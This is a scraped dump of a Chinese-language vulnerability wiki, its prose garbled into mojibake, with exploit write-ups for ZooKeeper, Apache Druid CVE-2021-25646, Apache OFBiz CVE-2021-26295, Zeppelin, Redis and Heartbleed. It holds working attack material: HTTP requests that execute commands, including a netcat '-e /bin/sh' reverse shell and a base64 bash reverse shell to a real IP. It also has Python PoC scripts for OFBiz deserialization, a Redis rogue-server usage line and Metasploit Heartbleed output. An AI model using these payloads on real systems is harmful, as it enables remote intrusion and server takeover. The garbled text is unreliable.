æ¼æ´å¤ç° Apache ZooKeeper é»˜è®¤å¼€æ”¾ 2181ç«¯å£ ,ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è·å–æ•æ„Ÿæ•°æ® echo envi | nc xxx.xxx.xxx.xxx 2181 å…¶ä»–ä¿¡æ¯ 1ã€statï¼šåˆ—å‡ºå…³äºæ€§èƒ½å’Œè¿æ¥çš„å®¢æˆ·ç«¯çš„ç»Ÿè®¡ä¿¡æ¯ã€‚ echo stat |ncat 127.0.0.1 2181 2ã€ruokï¼šæµ‹è¯•æœåŠ¡å™¨æ˜¯å¦è¿è¡Œåœ¨éé”™è¯¯çŠ¶æ€ã€‚ echo ruok |ncat 127.0.0.1 2181 3ã€reqsï¼šåˆ—å‡ºæœªå®Œæˆçš„è¯·æ±‚ã€‚ echo reqs |ncat 127.0.0.1 2181 ã€€ã€€ 4ã€enviï¼šæ‰“å°æœ‰å…³æœåŠ¡ç¯å¢ƒçš„è¯¦ç»†ä¿¡æ¯ã€‚ echo envi |ncat 127.0.0.1 2181 ã€€ã€€ 5ã€dumpï¼šåˆ—å‡ºæœªå®Œæˆçš„ä¼šè¯å’Œä¸´æ—¶èŠ‚ç‚¹ã€‚ echo dump |ncat 127.0.0.1 2181 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Druid/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Druid/","title":"Apache Druid","keywords":"","body":"Apache Druid Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-25646 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-02 18:48:12 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Druid/Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-25646.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Druid/Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-25646.html","title":"Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-25646","keywords":"","body":"Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-25646 æ¼æ´æè¿° Apache Druid æ˜¯ç”¨Javaç¼–å†™çš„é¢å‘åˆ—çš„å¼€æºåˆ†å¸ƒå¼æ•°æ®å­˜å‚¨ï¼Œæ—¨åœ¨å¿«é€Ÿè·å–å¤§é‡äº‹ä»¶æ•°æ®ï¼Œå¹¶åœ¨æ•°æ®ä¹‹ä¸Šæä¾›ä½å»¶è¿ŸæŸ¥è¯¢ã€‚ Apache Druid é»˜è®¤æƒ…å†µä¸‹ç¼ºä¹æˆæƒè®¤è¯ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ç‰¹åˆ¶è¯·æ±‚ï¼Œåˆ©ç”¨DruidæœåŠ¡å™¨ä¸Šè¿›ç¨‹çš„ç‰¹æƒæ‰§è¡Œä»»æ„ä»£ç ã€‚ Apache DruidåŒ…æ‹¬æ‰§è¡Œç”¨æˆ·æä¾›çš„JavaScriptçš„åŠŸèƒ½åµŒå…¥åœ¨å„ç§ç±»å‹è¯·æ±‚ä¸­çš„ä»£ç ã€‚æ­¤åŠŸèƒ½åœ¨ç”¨äºé«˜ä¿¡ä»»åº¦ç¯å¢ƒä¸­ï¼Œé»˜è®¤å·²è¢«ç¦ç”¨ã€‚ä½†æ˜¯ï¼Œåœ¨Druid 0.20.0åŠæ›´ä½ç‰ˆæœ¬ä¸­ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·å‘é€æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨Apache Druidæ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç  æ¼æ´å½±å“ [!NOTE] Apache Druid ç¯å¢ƒæ­å»º è¿™é‡Œä½¿ç”¨Dockeræ¥æ­å»ºç¯å¢ƒ Dockerä¸‹è½½é“¾æ¥: https://github.com/apache/druid/archive/druid-0.20.0.zip ä¸‹è½½ä¹‹åè¿›å…¥ç›®å½• distribution\\docker æ‰§è¡Œå‘½ä»¤ç¼–è¯‘ docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8888 æ­£å¸¸å°±è¡Œäº† æ¼æ´å¤ç° æ¼æ´åŸç†: https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw POCè¯·æ±‚åŒ… POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxxâ€‹:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('ping xxxxx.dnslog.cn')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} [!NOTE] æ³¨æ„è¯·æ±‚ä¸­è¿™ä¸ªä½ç½®æ”¹ä¸ºä½ çš„dnslogå¹³å°åœ°å€ java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn') å‘é€è¯·æ±‚å³å¯å‘½ä»¤æ‰§è¡Œ [!NOTE] çœ‹äº†ä¸‹å¯èƒ½å¤§éƒ¨åˆ†éƒ½æ˜¯dockeræ­å»ºï¼Œè€Œé‡Œé¢å¤§éƒ¨åˆ†å‘½ä»¤æ˜¯ä¸å­˜åœ¨çš„ï¼Œä½†æ˜¯å‘ç°dockeré‡Œé¢å±…ç„¶é»˜è®¤æ˜¯æœ‰ NC å‘½ä»¤çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨ncåå¼¹ä¸€ä¸ªshelläº† åå¼¹shellè¯·æ±‚åŒ… POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxxâ€‹:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 1008 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} å‘é€è¯·æ±‚åŒ…å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªäº¤äº’å¼shelläº† PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache OFBiz/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache OFBiz/","title":"Apache OFBiz","keywords":"","body":"Apache OFBiz Apache OFBiz RMIååºåˆ—åŒ–æ¼æ´ CVE-2021-26295 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-24 00:06:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache OFBiz/Apache OFBiz RMIååºåˆ—åŒ–æ¼æ´ CVE-2021-26295.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache OFBiz/Apache OFBiz RMIååºåˆ—åŒ–æ¼æ´ CVE-2021-26295.html","title":"Apache OFBiz RMIååºåˆ—åŒ–æ¼æ´ CVE-2021-26295","keywords":"","body":"Apache OFBiz rmiååºåˆ—åŒ–æ¼æ´ CVE-2021-26295 æ¼æ´æè¿° OFBizæ˜¯åŸºäºJavaçš„Webæ¡†æ¶ï¼ŒåŒ…æ‹¬å®ä½“å¼•æ“ï¼ŒæœåŠ¡å¼•æ“å’ŒåŸºäºå°éƒ¨ä»¶çš„UIã€‚ è¿‘æ—¥ï¼ŒApache OFBizå®˜æ–¹å‘å¸ƒå®‰å…¨æ›´æ–°ã€‚Apache OFBiz å­˜åœ¨RMIååºåˆ—åŒ–å‰å°å‘½ä»¤æ‰§è¡Œï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ­¤æ¼æ´æ¥æˆåŠŸæ¥ç®¡Apache OFBizï¼Œå»ºè®®ç›¸å…³ç”¨æˆ·å°½å¿«æµ‹è¯•æ¼æ´ä¿®å¤çš„ç‰ˆæœ¬å¹¶åŠæ—¶å‡çº§ã€‚ æ¼æ´å½±å“ [!NOTE] Apache OFBiz FOFA [!NOTE] app=\"Apache_OFBiz\" ç¯å¢ƒæ­å»º docker run -d -p 8000:8080 -p 8443:8443 opensourceknight/ofbiz æ¼æ´å¤ç° ä½¿ç”¨æ–‡ç« ç›®å½•ä¸­çš„POCè„šæœ¬ éªŒè¯ Dnslog åå¼¹shellä½¿ç”¨ ROMEååºåˆ—åŒ–é“¾å°±è¡Œäº† java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' bash -c 'exec bash -i &>/dev/tcp/81.68.139.186/9999 ç„¶åæŠŠæ•°æ®å¡«å…¥ä¸‹é¢çš„ åå¼¹shellè„šæœ¬ä¸­çš„Hex_dataå‚æ•°ä¸­è¿è¡Œè„šæœ¬å³å¯åå¼¹shell æ¼æ´åˆ©ç”¨POC [!NOTE] éœ€è¦å°†POCæ”¾åœ¨ä¸ ysoserial.jar åŒä¸€ç›®å½• ä¸€ä¸ªä¸º dnslogæ£€æµ‹ï¼Œå¦ä¸€ä¸ªä¸ºåå¼¹shell import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def trans(s): return \"%s\" % ''.join('%.2x' % x for x in s) def POC_1(target_url, Dnslog): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', \"URLDNS\", Dnslog], stdout=subprocess.PIPE) data = popen.stdout.read() hex_data = trans(data) headers = { 'Content-Type': 'text/xml' } post_data = '''%s''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] è¯·æ£€æŸ¥ Dnslog å“åº”\\n \\033[0m\") else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) [!NOTE] åå¼¹shellè„šæœ¬ import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mHex_data >>> åœ¨æ–‡ä»¶ä¸­ä¿®æ”¹ \\033[0m') print('+------------------------------------------') def POC_1(target_url, Dnslog): # java -jar ysoserial.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' hex_data = \"aced0xxxxxxxxxxxxxxxxxxxxxx678\" headers = { 'Content-Type': 'text/xml' } post_data = '''%s''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] è¯·æ£€æŸ¥ ç›‘å¬åœ°å€ å“åº”\\n \\033[0m\") else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, Dnslog) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Zeppelin/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Zeppelin/","title":"Apache Zeppelin","keywords":"","body":"Apache Zeppelin Apache Zeppelin æœªæˆæƒä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-22 19:17:44 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Zeppelin/Apache Zeppelin æœªæˆæƒä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Zeppelin/Apache Zeppelin æœªæˆæƒä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Apache Zeppelin æœªæˆæƒä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Apache Zeppelin æœªæˆæƒä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Apache Zeppelin å­˜åœ¨æœªæˆæƒçš„ç”¨æˆ·è®¿é—®å‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œå¯¼è‡´äº†ä»»æ„ç”¨æˆ·éƒ½å¯ä»¥æ‰§è¡Œæ¶æ„å‘½ä»¤è·å–æœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] Apache Zeppelin FOFA [!NOTE] icon_hash=\"960250052\" æ¼æ´å¤ç° å«æœ‰æ¼æ´çš„é¡µé¢å¦‚ä¸‹ ç‚¹å‡» åˆ›å»ºä¸€ä¸ªåŒ¿åç”¨æˆ·åœ¨ç”¨æˆ·é¡µé¢æ‰§è¡Œå‘½ä»¤å³å¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/","title":"æœåŠ¡å™¨åº”ç”¨æ¼æ´","keywords":"","body":"æœåŠ¡å™¨åº”ç”¨æ¼æ´ğŸ¦” PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 19:47:34 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/","title":"Redis","keywords":"","body":"Redis Redis PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-08 21:42:38 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/Redis å°äº5.0.5 ä¸»ä»å¤åˆ¶ RCE .html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/Redis/Redis å°äº5.0.5 ä¸»ä»å¤åˆ¶ RCE .html","title":"Redis <= 5.0.5 ä¸»ä»å¤åˆ¶ RCE ","keywords":"","body":"Redis æ¼æ´æè¿° åœ¨2019å¹´7æœˆ7æ—¥ç»“æŸçš„WCTF2019 Finalä¸Šï¼ŒLC/BCçš„æˆå‘˜Pavel Toporkovåœ¨åˆ†äº«ä¼šä¸Šä»‹ç»äº†ä¸€ç§å…³äºredisæ–°ç‰ˆæœ¬çš„RCEåˆ©ç”¨æ–¹å¼ï¼Œæ¯”èµ·ä»¥å‰çš„åˆ©ç”¨æ–¹å¼æ¥è¯´ï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼æ›´ä¸ºé€šç”¨ï¼Œå±å®³ä¹Ÿæ›´å¤§ Pavel Toporkovçš„åˆ†äº« å½±å“ç‰ˆæœ¬ [!NOTE] Redis ç¯å¢ƒæ­å»º docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server nmapæ‰«æä¸€ä¸‹6379ç«¯å£å¼€æ”¾å³ä¸ºæ­å»ºæˆåŠŸ root@kali:~/æ¡Œé¢# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/æ¡Œé¢# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/æ¡Œé¢# nmap 127.0.0.1 -p 6379 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:47 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.000099s latency). PORT STATE SERVICE 6379/tcp open redis Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds æ¼æ´å¤ç° å…³äºæ¼æ´åŸç†è¯·æŸ¥çœ‹Pavel Toporkovçš„åˆ†äº« æ¼æ´åˆ©ç”¨è„šæœ¬: n0b0dyCN/redis-rogue-server âœ ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/","title":"OpenSSL","keywords":"","body":"OpenSSL OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-12 14:49:36 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/OpenSSL/OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160.html","title":"OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160","keywords":"","body":"OpenSSL å¿ƒè„æ»´è¡€æ¼æ´ CVE-2014-0160 æ¼æ´æè¿° 2014å¹´4æœˆ7æ—¥ï¼ŒOpenSSLå‘å¸ƒå®‰å…¨å…¬å‘Šï¼Œåœ¨OpenSSL1.0.1ç‰ˆæœ¬è‡³OpenSSL1.0.1f Beta1ç‰ˆæœ¬ä¸­å­˜åœ¨æ¼æ´ï¼Œè¯¥æ¼æ´ä¸­æ–‡åç§°ä¸ºå¿ƒè„æ»´è¡€ï¼Œè‹±æ–‡åç§°ä¸ºHeartBleedã€‚å…¶ä¸­Heartæ˜¯æŒ‡è¯¥æ¼æ´ä½äºå¿ƒè·³åè®®ä¸Šï¼ŒBleedæ˜¯å› ä¸ºè¯¥æ¼æ´ä¼šé€ æˆæ•°æ®æ³„éœ²ã€‚å³HeartBleedæ˜¯åœ¨å¿ƒè·³åè®®ä¸Šçš„ä¸€ä¸ªæ•°æ®æ³„éœ²æ¼æ´ï¼ŒOpenSSLåº“ä¸­ç”¨åˆ°äº†è¯¥å¿ƒè·³åè®®ã€‚HeartBleedä¸»è¦å­˜åœ¨ä¸OpenSSLçš„1.0.1ç‰ˆæœ¬åˆ°1.0.1fç‰ˆæœ¬ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] OpenSSL1.0.1ã€1.0.1aã€1.0.1bã€1.0.1cã€1.0.1dã€1.0.1eã€1.0.1fã€Beta 1 of OpenSSL 1.0.2ç­‰ç‰ˆæœ¬ ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d æ¼æ´å¤ç° ä½¿ç”¨Nmapæ£€æµ‹è„šæœ¬å¯¹ç›®æ ‡è¿›è¡Œæ£€æµ‹ æ£€æµ‹åˆ°å¿ƒè„æ»´è¡€æ¼æ´ï¼Œä½¿ç”¨MSFå¯¹ç›®æ ‡è¿›è¡Œæ”»å‡» msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads (max one per host) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhost 192.168.51.133 rhost => 192.168.51.133 msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run [*] 192.168.51.133:443 - Leaking heartbeat response #1 [*] 192.168.51.133:443 - Sending Client Hello... [*] 192.168.51.133:443 - SSL record #1: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 86 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 82 [*] 192.168.51.133:443 - Type: Server Hello (2) [*] 192.168.51.133:443 - Server Hello Version: 0x0301 [*] 192.168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [*] 192.168.51.133:443 - Server Hello Session ID length: 32 [*] 192.168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [*] 192.168.51.133:443 - SSL record #2: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 822 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 818 [*] 192.168.51.133:443 - Type: Certificate Data (11) [*] 192.168.51.133:443 - Certificates length: 815 [*] 192.168.51.133:443 - Data length: 818 [*] 192.168.51.133:443 - Certificate #1: [*] 192.168.51.133:443 - Certificate #1: Length: 812 [*] 192.168.51.133:443 - Certificate #1: #, issuer=#, serial=#, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [*] 192.168.51.133:443 - SSL record #3: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 331 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 327 [*] 192.168.51.133:443 - Type: Server Key Exchange (12) [*] 192.168.51.133:443 - SSL record #4: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 4 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 